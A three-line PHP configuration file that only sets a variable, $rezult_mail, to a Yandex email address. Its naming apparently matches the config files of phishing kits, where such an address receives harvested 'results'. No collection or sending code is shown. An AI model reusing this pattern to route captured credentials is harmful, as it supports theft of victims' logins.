<?php 
$rezult_mail="venz84@yandex.com";
?>